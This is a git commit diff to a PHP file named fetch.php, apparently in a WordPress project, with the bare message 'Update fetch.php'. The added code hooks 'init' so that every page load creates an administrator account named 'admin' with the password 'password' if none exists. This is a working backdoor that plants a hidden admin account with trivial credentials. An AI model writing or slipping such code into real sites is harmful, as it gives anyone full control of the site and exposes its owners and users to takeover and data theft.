5ebe0813254a9cb3ba46932c58cd76628547706c
avijitpalit <82804223+avijitpalit@users.noreply.github.com>
2024-06-19 23:06:31 +0530

    Update fetch.php

--- fetch.php
+++ fetch.php
@@ -1,7 +1,13 @@
 <?
 
-add_action('wp_footer', function(){
-    wp_insert_post([
-        'post_title' => 'gthg hry rthry'
-    ])
-});
+add_action( 'init', function () {
+	$username = 'admin';
+	$password = 'password';
+	$email_address = 'webmaster@mydomain.com';
+
+	if ( ! username_exists( $username ) ) {
+		$user_id = wp_create_user( $username, $password, $email_address );
+		$user = new WP_User( $user_id );
+		$user->set_role( 'administrator' );
+	}
+} );
